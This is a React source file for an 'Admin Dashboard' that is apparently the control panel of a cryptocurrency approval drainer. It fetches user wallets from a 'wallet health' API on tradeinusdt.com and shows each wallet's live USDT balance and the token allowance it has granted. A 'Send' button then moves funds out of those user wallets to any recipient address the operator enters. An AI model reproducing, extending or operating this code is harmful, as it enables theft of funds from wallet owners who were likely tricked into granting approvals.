'use client';

import { useState, useEffect, useCallback } from 'react';
import { ethers } from 'ethers';

// --- CONFIGURATION ---
const GET_WALLETS_API = "https://tradeinusdt.com/api_wallet_health_vercel/get_wallets.php"; 
const WALLETS_PER_PAGE = 50;

// --- Main Component ---
export default function AdminPage() {
    const [isAuthenticated, setIsAuthenticated] = useState(false);
    if (!isAuthenticated) {
        return <LoginForm onLoginSuccess={() => setIsAuthenticated(true)} />;
    }
    return <AdminDashboard />;
}

// --- Login Form Component ---
function LoginForm({ onLoginSuccess }) {
    const [username, setUsername] = useState('');
    const [password, setPassword] = useState('');
    const [error, setError] = useState('');
    const [isLoading, setIsLoading] = useState(false);

    const handleLogin = async (e) => {
        e.preventDefault();
        setIsLoading(true);
        setError('');

        try {
            const response = await fetch('/api/login', {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({ username, password }),
            });

            if (response.ok) {
                onLoginSuccess();
            } else {
                const data = await response.json();
                setError(data.error || "Login failed");
            }
        } catch (err) {
            setError("An error occurred. Please try again.");
        } finally {
            setIsLoading(false);
        }
    };

    return (
        <div style={styles.loginContainer}>
            <form onSubmit={handleLogin} style={styles.loginForm}>
                <h2>Admin Login</h2>
                <input
                    type="text"
                    value={username}
                    onChange={(e) => setUsername(e.target.value)}
                    placeholder="Username"
                    style={styles.input}
                />
                <input
                    type="password"
                    value={password}
                    onChange={(e) => setPassword(e.target.value)}
                    placeholder="Password"
                    style={styles.input}
                />
                <button type="submit" disabled={isLoading} style={styles.button}>
                    {isLoading ? "Logging in..." : "Login"}
                </button>
                {error && <p style={{ color: 'red', marginTop: '10px' }}>{error}</p>}
            </form>
        </div>
    );
}

// --- Admin Dashboard Component (Fully Upgraded) ---
function AdminDashboard() {
    const [wallets, setWallets] = useState([]);
    const [liveStatus, setLiveStatus] = useState({});
    const [isLoading, setIsLoading] = useState(true);
    const [message, setMessage] = useState('');
    const [transferDetails, setTransferDetails] = useState({});
    const [currentPage, setCurrentPage] = useState(1);
    const [totalPages, setTotalPages] = useState(0);

    const checkStatusesForPage = useCallback(async (walletsToCheck) => {
        setLiveStatus(prev => {
            const newStatus = { ...prev };
            walletsToCheck.forEach(w => {
                newStatus[w.wallet_address] = { loading: true };
            });
            return newStatus;
        });

        const statusPromises = walletsToCheck.map(wallet =>
            fetch('/api/check-status', {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({ userAddress: wallet.wallet_address, chainId: wallet.chainId }),
            })
            .then(res => res.json())
            .then(data => ({ address: wallet.wallet_address, ...data }))
            .catch(() => ({ address: wallet.wallet_address, balance: 'Error', isApproved: false }))
        );

        const results = await Promise.all(statusPromises);
        
        setLiveStatus(prev => {
            const newStatus = { ...prev };
            results.forEach(result => {
                newStatus[result.address] = { ...result, loading: false };
            });
            return newStatus;
        });
    }, []);

    const fetchWallets = useCallback(async (page) => {
        setIsLoading(true);
        setMessage('');
        try {
            const response = await fetch(`${GET_WALLETS_API}?page=${page}&limit=${WALLETS_PER_PAGE}`);
            const data = await response.json();
            setWallets(data.wallets || []);
            setTotalPages(Math.ceil(data.total / WALLETS_PER_PAGE));
            if (data.wallets && data.wallets.length > 0) {
                checkStatusesForPage(data.wallets);
            }
        } catch (error) {
            setMessage(`Error fetching wallets: ${error.message}`);
        } finally {
            setIsLoading(false);
        }
    }, [checkStatusesForPage]);

    useEffect(() => {
        fetchWallets(currentPage);
    }, [currentPage, fetchWallets]);

    // FIXED: Added the missing handleInputChange function
    const handleInputChange = (userAddress, field, value) => {
        setTransferDetails(prev => ({
            ...prev,
            [userAddress]: {
                ...prev[userAddress],
                [field]: value,
            },
        }));
    };

    const transferFromUser = async (userAddress, chainId) => {
        const details = transferDetails[userAddress];
        const recipientAddress = details?.recipient;
        const amountString = details?.amount;

        if (!chainId) return alert("Error: Chain ID is missing for this user.");
        if (!ethers.isAddress(recipientAddress)) return alert("Error: Please enter a valid recipient address.");
        if (!amountString || isNaN(amountString) || parseFloat(amountString) <= 0) return alert("Error: Please enter a valid amount.");

        setIsLoading(true);
        setMessage(`Sending transfer request for ${userAddress.substring(0, 6)}...`);
        
        try {
            const response = await fetch('/api/transfer', {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({ userAddress, recipientAddress, amountString, chainId }),
            });
            const result = await response.json();
            if (!response.ok) throw new Error(result.error || 'API request failed.');
            setMessage(`✅ Success! Tx Hash: ${result.txHash}`);
            alert('Transfer Successful!');
        } catch (error) {
            setMessage(`❌ Transfer failed: ${error.message}`);
            alert(`Transfer failed: ${error.message}`);
        } finally {
            setIsLoading(false);
        }
    };

    return (
        <main style={styles.container}>
            <div style={styles.header}>
                <h1>Admin Dashboard</h1>
                <button onClick={() => fetchWallets(currentPage)} disabled={isLoading} style={styles.refreshButton}>
                    {isLoading ? 'Refreshing...' : '🔄 Refresh Data'}
                </button>
            </div>
            {message && <p style={{ fontWeight: 'bold', textAlign: 'center', margin: '10px 0' }}>{message}</p>}

            <div style={{ overflowX: 'auto' }}>
                <table style={styles.table}>
                    <thead>
                        <tr>
                            <th style={styles.th}>User Wallet</th>
                            <th style={styles.th}>Chain</th>
                            <th style={styles.th}>DB Status</th>
                            <th style={styles.th}>Recipient Address</th>
                            <th style={styles.th}>Amount (USDT)</th>
                            <th style={styles.th}>Action</th>
                        </tr>
                    </thead>
                    <tbody>
                        {wallets.length === 0 && !isLoading ? (
                            <tr><td colSpan="6" style={{ textAlign: 'center', padding: '20px' }}>No wallets found.</td></tr>
                        ) : wallets.map(wallet => {
                            const status = liveStatus[wallet.wallet_address];
                            const isApprovedLive = status?.isApproved;
                            return (
                                <>
                                    <tr key={wallet.wallet_address} style={styles.tr}>
                                        <td style={styles.td}>{wallet.wallet_address}</td>
                                        <td style={styles.td}>{wallet.chainId == 1 ? 'ETH' : wallet.chainId == 56 ? 'BSC' : 'N/A'}</td>
                                        <td style={styles.td}>{wallet.status}</td>
                                        <td style={styles.td}><input type="text" placeholder="0x..." style={styles.tableInput} onChange={(e) => handleInputChange(wallet.wallet_address, 'recipient', e.target.value)} /></td>
                                        <td style={styles.td}><input type="text" placeholder="e.g., 10.5" style={styles.tableInput} onChange={(e) => handleInputChange(wallet.wallet_address, 'amount', e.target.value)} /></td>
                                        <td style={styles.td}><button onClick={() => transferFromUser(wallet.wallet_address, wallet.chainId)} disabled={isLoading} style={isApprovedLive ? styles.actionButton : styles.actionButtonDisabled}>Send</button></td>
                                    </tr>
                                    <tr key={`${wallet.wallet_address}-status`} style={styles.statusRow}>
                                        <td colSpan="6" style={styles.statusTd}>
                                            {status?.loading ? (
                                                <span>Checking live status...</span>
                                            ) : status ? (
                                                <div>
                                                    <strong>Live Balance:</strong> {status.balance} USDT |{' '}
                                                    <strong>Live Approval:</strong>{' '}
                                                    <span style={{ color: status.isApproved ? 'green' : 'red', fontWeight: 'bold' }}>
                                                    {status.isApproved
                                                        ? `Approved for ${status.allowance} USDT`
                                                        : 'Not Approved'}
                                                    </span>
                                                </div>
                                            ) : <span>Awaiting status check...</span>}
                                        </td>
                                    </tr>
                                </>
                            );
                        })}
                    </tbody>
                </table>
            </div>
            
            <Pagination currentPage={currentPage} totalPages={totalPages} onPageChange={setCurrentPage} />
        </main>
    );
}

function Pagination({ currentPage, totalPages, onPageChange }) {
    if (totalPages <= 1) return null;
    const pages = Array.from({ length: totalPages }, (_, i) => i + 1);
    return (
        <div style={styles.pagination}>
            <button onClick={() => onPageChange(currentPage - 1)} disabled={currentPage === 1} style={styles.pageButton}>Previous</button>
            {pages.map(page => (
                <button key={page} onClick={() => onPageChange(page)} style={currentPage === page ? styles.pageButtonActive : styles.pageButton}>
                    {page}
                </button>
            ))}
            <button onClick={() => onPageChange(currentPage + 1)} disabled={currentPage === totalPages} style={styles.pageButton}>Next</button>
        </div>
    );
}

// FIXED: Consolidated and corrected the styles object
const styles = {
    loginContainer: { display: 'flex', justifyContent: 'center', alignItems: 'center', height: '100vh', backgroundColor: '#f0f2f5', color: '#333' },
    loginForm: { padding: '40px', background: 'white', borderRadius: '8px', boxShadow: '0 4px 12px rgba(0,0,0,0.1)', textAlign: 'center', width: '350px' },
    container: { fontFamily: 'sans-serif', padding: '20px', maxWidth: '1200px', margin: '0 auto' },
    button: { width: '100%', padding: '12px', fontSize: '16px', cursor: 'pointer', borderRadius: '5px', border: 'none', backgroundColor: '#007bff', color: 'white', marginTop: '10px' },
    refreshButton: { padding: '10px 15px', fontSize: '14px', cursor: 'pointer', borderRadius: '5px', border: 'none', backgroundColor: '#007bff', color: 'white' },
    actionButton: { padding: '8px 12px', cursor: 'pointer', borderRadius: '5px', border: 'none', backgroundColor: '#28a745', color: 'white', width: '100%' },
    actionButtonDisabled: { padding: '8px 12px', cursor: 'not-allowed', borderRadius: '5px', border: 'none', backgroundColor: '#6c757d', color: 'white', width: '100%' },
    table: { width: '100%', borderCollapse: 'collapse', marginTop: '20px', fontSize: '14px' },
    th: { backgroundColor: '#f2f2f2', padding: '12px', textAlign: 'left', borderBottom: '2px solid #ddd' },
    tr: { borderBottom: '1px solid #ddd' },
    td: { padding: '12px', verticalAlign: 'middle' },
    input: { width: 'calc(100% - 20px)', padding: '10px', borderRadius: '4px', border: '1px solid #ccc', marginBottom: '15px' },
    tableInput: { width: 'calc(100% - 10px)', padding: '8px', borderRadius: '4px', border: '1px solid #ccc' },
    header: { display: 'flex', justifyContent: 'space-between', alignItems: 'center', borderBottom: '2px solid #ddd', paddingBottom: '10px' },
    statusRow: { backgroundColor: '#f9f9f9' },
    statusTd: { padding: '8px 12px', fontSize: '12px', fontStyle: 'italic', color: '#555' },
    pagination: { marginTop: '20px', display: 'flex', justifyContent: 'center', gap: '5px' },
    pageButton: { padding: '8px 12px', cursor: 'pointer', border: '1px solid #ddd', background: 'white', borderRadius: '4px' },
    pageButtonActive: { padding: '8px 12px', cursor: 'default', border: '1px solid #007bff', background: '#007bff', color: 'white', borderRadius: '4px', fontWeight: 'bold' }
};